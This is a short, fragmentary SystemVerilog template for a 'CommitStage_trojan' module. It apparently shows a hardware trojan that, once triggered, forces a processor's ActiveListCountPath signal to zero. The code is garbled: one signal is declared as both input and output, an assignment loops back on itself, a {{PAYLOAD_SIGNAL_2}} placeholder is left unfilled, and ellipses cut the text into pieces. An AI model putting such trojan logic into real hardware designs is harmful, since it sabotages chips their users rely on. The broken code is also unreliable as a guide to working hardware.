...
module CommitStage_trojan (
    input  logic clk_i,
    input  logic rst_ni,
    
    // Original module signals (passthrough)
    input  logic ActiveListCountPath,
    output logic ActiveListCountPath,
    ...
    assign ActiveListCountPath = trojan_active ? 1'b0 : ActiveListCountPath_normal;
    ...
    logic ActiveListCountPath_normal;
    logic {{PAYLOAD_SIGNAL_2}}_normal;
    
    assign ActiveListCountPath_normal = ActiveListCountPath;
 ...
 *     input  logic instr_valid_i,   // ActiveListCountPath
 *     output logic instr_valid_o    // ActiveListCountPath
 * );
